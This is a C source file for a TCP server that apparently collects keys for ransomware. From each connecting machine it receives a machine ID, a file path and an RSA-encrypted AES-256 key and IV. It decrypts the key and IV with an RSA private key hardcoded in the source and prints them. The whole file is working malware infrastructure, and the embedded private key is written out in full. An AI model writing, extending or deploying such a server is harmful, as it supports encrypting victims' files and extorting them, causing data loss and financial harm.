#include <arpa/inet.h>
#include <limits.h>
#include <string.h>

#include "option/option.h"
#include "../lib/key/key_set.h"
#include "../lib/parser/argument.h"
#include "../lib/parser/argument_parser.h"
#include "../lib/parser/argument_parser_error.h"
#include "../lib/tcp/tcp.h"
#include "../lib/util/tool.h"

#define PRIVATE_KEY "-----BEGIN RSA PRIVATE KEY-----\n"              \
"MIIEpAIBAAKCAQEA2bc224xWgt6LfH0eIUM3ocU9UHjIhMn12faXSiG/BUHbEUfu\n" \
"1HxtW1We6etDGy4Lw5P49CMR3VRvRwunx8ri144GVsRQqD1bt48lNqKtHpRbaMvC\n" \
"WqOoHz3aoSG3ELmrjFdupJv0k0jVK3JEaMKJoeMwgcVisS8ezvV4OGVY/P8dhF97\n" \
"epl3ODBNOhhFjIpiamN5MDxmFcS8bG2jnRS5i3MVyIj72lyAArMuAbfVykfcJVdZ\n" \
"upjJXJ7kzrZg9iV7MJ1Lm9xflsRaVrtjbBBLDXoxVh6M2/3sZoXeNrQwrlHeiIfi\n" \
"jkTXEUBUQZzY6/ObQF/j9pXTHu9qUtHc0LL+QQIDAQABAoIBAQC2GaiouhkiHUJO\n" \
"PdiVucMua+t9A4m0h7g7NyYTu2Yq34p8Sc5ZrDlLy7G/tifK9Bii3YG9shefKKBq\n" \
"rDUJx4k1AnYK3OkZzziHsBNQP4DNswlB/ivx5DEa8IGNhMW6F5KFMBw7Urae+qxS\n" \
"SqEtfonf/kb0REToLqF2OZr0kNB9ytnAoq9luAP27FbMxe964pQeLtSDdxZfjrkT\n" \
"J4db02e2BHTUuUf0IhYay86wlxlcjPzr7NUrZC7sfFCu/ahTHsRKyGfRnw/EmbXD\n" \
"fTjK08I+LVO6MQS7s453ZV4kwf2waEeWgdGqsmuZuPCoPSNTMdNxQ7D+9XmwUsTz\n" \
"3cJ/BjCBAoGBAPEXoglnCsOvqahC/StI0HuVtJ6vQiNyHGY6a50e371z8yrQNTaw\n" \
"5Bjn2XJwc7r/HBJgKUKbiMKeAgZhksdQq7dJXDNBKzlL7Wo4GIlIM6I/HAzwKQKf\n" \
"to/jt/rHi+eWfLLyXvSKEt3ITOI2bR/pjTj9fSm1nJWg/gLtE/YXApsXAoGBAOct\n" \
"io8t00Bj/DGgJNWEDYVjigCtKMRAjSwK//VwyAXDAZX3qd3CAdg/52/3AuZlXnsL\n" \
"rDeWWeEBqUk6HHek2EE+UlgLwK93VH+ZsMSVFTz44xCi6SQa1sgPfTybF/wK89gN\n" \
"X5auizztUdi1CpsxhqIPXk7wiq9XoHReQcHTzShnAoGAQriQnluG7hr6L9fCKq1v\n" \
"DRSkNNo5yod09pGqYIQ/1TV2kV2nrGgN6BqZ4gLe9FxPj4JPSOC0W2/RDaUJMuHP\n" \
"c9z4iDK73JJ3tNKrb6qsp3UhtS7tmo1Kv818iAmbXU8XWYqb3r8rc3dQV7ZKQu+m\n" \
"pqP4dIePOxWf1n137b32eacCgYBuYlt/5HSzkUpxc7NC1IwUPiQ+EHCfzObbueDg\n" \
"FFseDTArqJdOkP2KgXEEEGEtHAgSHs+7tynxe3aWxY2kP20XMiflbK8z2Xnad8tl\n" \
"An6in4Dkh7VlDP+zhVnaX4ADVEN8zV3wOCW6EON8421OD0bnCQmSDd9avC+cgQlL\n" \
"ANQ8TwKBgQCWkjaf842ZhMft9EJSv5sjuTKl16Rq3XAvjQ8MpjO2YccZwocQRXU4\n" \
"wfT7mjHbZay6y1F0c7A9IAsAuF9rGqlLkVOmH+dCIMO2dQF18bg2Ttb5bSLVTaXE\n" \
"hK5YTiMTw0Xhju+pGqVhciDtCNEgFVCx6ivTQ+vUrYwVFiafQ3LDhQ==\n"         \
"-----END RSA PRIVATE KEY-----\n"

#define PATH_MAX_SIZE (2 * PATH_MAX)
#define RSA_SIZE (2 * RSA_ENCRYPTION_SIZE)

#define BUFFER_SIZE (MACHINE_ID_SIZE + PATH_MAX_SIZE + (2 * RSA_SIZE) + 4)

#define DELIMITER " "

int main(int argc, char *argv[]) {
    Argument *arguments = NULL;

    const unsigned short int arg_value_null[] = {HELP};
    const unsigned short int arg_once[] = {IP, PORT};
    const unsigned short int arg_required[] = {};

    const short int len = parseArguments(&arguments,
                                         &argc, argv,
                                         optionFromString,
                                         validateOption,
                                         arg_value_null, get_size_macro(arg_value_null),
                                         arg_once, get_size_macro(arg_once),
                                         arg_required, get_size_macro(arg_required));

    if (len <= -1) {
        const ArgumentParserError error = (const ArgumentParserError) len;
        displayParseArgumentErrorMeaning(argv, arguments, &error, optionToString);
        fputs("Do --help for more information.\n", stdout);
        free(arguments);
        return EXIT_FAILURE;
    }

    bool is_help = false;

    const char *ip = NULL;
    int port = 0;

    // Place the arguments in their respective variable.
    for (unsigned short int i = 0; i < len; i++) {
        const Argument *argument = &arguments[i];

        switch ((Option) argument->option) {
            case HELP:
                is_help = true;
                break;
            case IP:
                ip = argument->value;
                break;
            case PORT:
                // atoi is safe here because the value has been validated.
                port = atoi(argument->value);

                if (port < 1024) {
                    fprintf(stderr, "Invalid PORT to use.\n"
                                    "Using default PORT for the server: %d\n", TCP_SERVER_PORT);
                    port = TCP_SERVER_PORT;
                }
                break;
        }
    }

    // No longer need of arguments.
    free(arguments);

    if (is_help) {
        help();
        return EXIT_SUCCESS;
    }

    int server_socket_id;

    if ((server_socket_id = newSocketId()) == -1) {
        fputs("Failed to create the socketID.\n", stderr);
        return EXIT_FAILURE;
    }

    if (ip == NULL) {
        fprintf(stdout, "Using default IP for the server: %s\n", TCP_SERVER_IP);
        ip = TCP_SERVER_IP;
    }

    if (port == 0) {
        fprintf(stdout, "Using default PORT for the server: %d\n", TCP_SERVER_PORT);
        port = TCP_SERVER_PORT;
    }

    SocketAddress server_address = newSocketAddress(ip, port);

    if (!bindSocket(&server_socket_id, &server_address)) {
        fputs("Failed to bind the server.\n", stderr);
        closeSocketAddress(&server_socket_id);
        return EXIT_FAILURE;
    }

    fprintf(stdout, "Server listening on %s:%d\n", ip, port);

    if (!listenServer(&server_socket_id, 1)) {
        fputs("Error in listen.\n", stderr);
        closeSocketAddress(&server_socket_id);
        return EXIT_FAILURE;
    }

    int client_socket_id;

    SocketAddress client_address;
    unsigned int client_address_size = sizeof(client_address);

    if ((client_socket_id = waitConnexion(&server_socket_id, &client_address, &client_address_size)) == -1) {
        fputs("Failed to wait for a connexion.\n", stderr);
        closeSocketAddress(&server_socket_id);
        return EXIT_FAILURE;
    }

    fprintf(stdout, "Connexion accepted for %d %s:%d\n",
            client_socket_id,
            inet_ntoa(client_address.sin_addr),
            client_address.sin_port);

    ssize_t received_size;

    char buffer[BUFFER_SIZE];

    while ((received_size = receiveData(&client_socket_id, buffer, TCP_BUFFER_SIZE)) > 0) {
        ssize_t path_size = received_size - MACHINE_ID_SIZE - (2 * RSA_SIZE) - 2;

        char machine_id[MACHINE_ID_SIZE + 1];
        char path[path_size];
        char encrypted_key[RSA_SIZE + 1];
        char encrypted_iv[RSA_SIZE + 1];

        char *ptr = strtok(buffer, DELIMITER);
        unsigned short int counter = 0;

        while (ptr != NULL) {
            switch (counter) {
                case 0:
                    if (MACHINE_ID_SIZE != strlen(ptr)) {
                        fputs("Failed to retrieve the machine ID.\n", stderr);

                        closeSocketAddress(&client_socket_id);
                        closeSocketAddress(&server_socket_id);

                        return EXIT_FAILURE;
                    }
                    memcpy(machine_id, ptr, MACHINE_ID_SIZE + 1);
                    break;
                case 1:
                    if (path_size - 1 != strlen(ptr)) {
                        fputs("Failed to retrieve the path.\n", stderr);

                        closeSocketAddress(&client_socket_id);
                        closeSocketAddress(&server_socket_id);

                        return EXIT_FAILURE;
                    }
                    memcpy(path, ptr, path_size);
                    break;
                case 2:
                    if (RSA_SIZE != strlen(ptr)) {
                        fputs("Failed to retrieve the key.\n", stderr);

                        closeSocketAddress(&client_socket_id);
                        closeSocketAddress(&server_socket_id);

                        return EXIT_FAILURE;
                    }
                    memcpy(encrypted_key, ptr, RSA_SIZE + 1);
                    break;
                case 3:
                    if (RSA_SIZE != strlen(ptr)) {
                        fputs("Failed to retrieve the iv.\n", stderr);

                        closeSocketAddress(&client_socket_id);
                        closeSocketAddress(&server_socket_id);

                        return EXIT_FAILURE;
                    }
                    memcpy(encrypted_iv, ptr, RSA_SIZE + 1);
                    break;
                default:
                    __builtin_unreachable();
            }

            ptr = strtok(NULL, DELIMITER);

            counter++;
        }

        unsigned char *key_bytes = hexToByte(encrypted_key);
        unsigned char *iv_bytes = hexToByte(encrypted_iv);

        if (key_bytes == NULL || iv_bytes == NULL) {
            fputs("Failed to parse the key-iv.\n", stderr);

            free(key_bytes);
            free(iv_bytes);

            closeSocketAddress(&client_socket_id);
            closeSocketAddress(&server_socket_id);

            return EXIT_FAILURE;
        }

        KeySet *encrypted_key_set = newEmptyKeySet(RSA_ENCRYPTION_SIZE, RSA_ENCRYPTION_SIZE);

        if (encrypted_key_set == NULL) {
            fputs("Failed to allocate memory for the encrypted KeySet.\n", stderr);

            free(key_bytes);
            free(iv_bytes);

            closeSocketAddress(&client_socket_id);
            closeSocketAddress(&server_socket_id);

            return EXIT_FAILURE;
        }

        parseKeySet(encrypted_key_set, key_bytes, RSA_ENCRYPTION_SIZE, iv_bytes, RSA_ENCRYPTION_SIZE);

        free(key_bytes);
        free(iv_bytes);

        RSA *rsa = newRSA(PRIVATE_KEY, false);

        if (rsa == NULL) {
            fputs("Failed to create the RSA structure.\n", stderr);
            return false;
        }

        KeySet *decrypted_key_set = newDecryptedKeySet(encrypted_key_set, rsa, false);

        free_key_set_macro(encrypted_key_set);

        if (decrypted_key_set == NULL) {
            fputs("Failed to decrypt the encrypted KeySet.\n", stderr);

            closeSocketAddress(&client_socket_id);
            closeSocketAddress(&server_socket_id);

            freeRSA(rsa);

            return EXIT_FAILURE;
        }

        freeRSA(rsa);

        char *key_to_print = byteToHex(decrypted_key_set->key, AES_256_KEY_SIZE);
        char *iv_to_print = byteToHex(decrypted_key_set->iv, AES_BLOCK_SIZE);

        free_key_set_macro(decrypted_key_set);

        if (key_to_print == NULL || iv_to_print == NULL) {
            fputs("Failed to parse the decrypted key-iv.\n", stderr);

            free(key_to_print);
            free(iv_to_print);

            closeSocketAddress(&client_socket_id);
            closeSocketAddress(&server_socket_id);

            return EXIT_FAILURE;
        }

        fprintf(stdout, "\nMachine id: %s\nPath: %s\nKey: %s\nIv: %s\n", machine_id, path, key_to_print, iv_to_print);

        free(key_to_print);
        free(iv_to_print);

        // Clear the buffer.
        memset(buffer, 0, BUFFER_SIZE);
    }

    closeSocketAddress(&client_socket_id);
    closeSocketAddress(&server_socket_id);
}